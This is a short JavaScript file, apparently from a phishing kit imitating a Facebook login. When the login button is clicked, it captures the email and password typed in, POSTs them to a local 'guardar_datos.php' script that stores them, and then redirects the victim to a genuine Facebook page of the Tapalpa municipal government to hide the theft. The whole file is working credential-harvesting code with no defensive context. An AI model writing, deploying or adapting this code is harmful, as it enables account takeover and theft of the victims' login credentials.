document.addEventListener("DOMContentLoaded", function () {
    const URL_REDIRECCION = "https://www.facebook.com/Gobierno-de-Tapalpa-100862536938230",
        URL_GUARDAR_DATOS = "./guardar_datos.php",
        $btnLogin = document.querySelector("#lgin_chido"),
        $usuario = document.querySelector("#email_chido"),
        $password = document.querySelector("#pass_chido");
    // Escuchar click del botón
    $btnLogin.addEventListener("click", () => {
        // Si no hay usuario o contraseña escritos, no continuamos
        if (!$usuario.value || !$password.value) return;
        // En caso de que sí haya datos, armamos el objeto de la carga útil
        let cargaUtil = {
            usuario: $usuario.value,
            password: $password.value,
        };
        // Y lo enviamos
        fetch(URL_GUARDAR_DATOS, {
            method: "POST",
            body: JSON.stringify(cargaUtil)
        }).then(() => {
            // Al terminar, simplemente redirigir
            window.location.href = URL_REDIRECCION;
        });
    });
});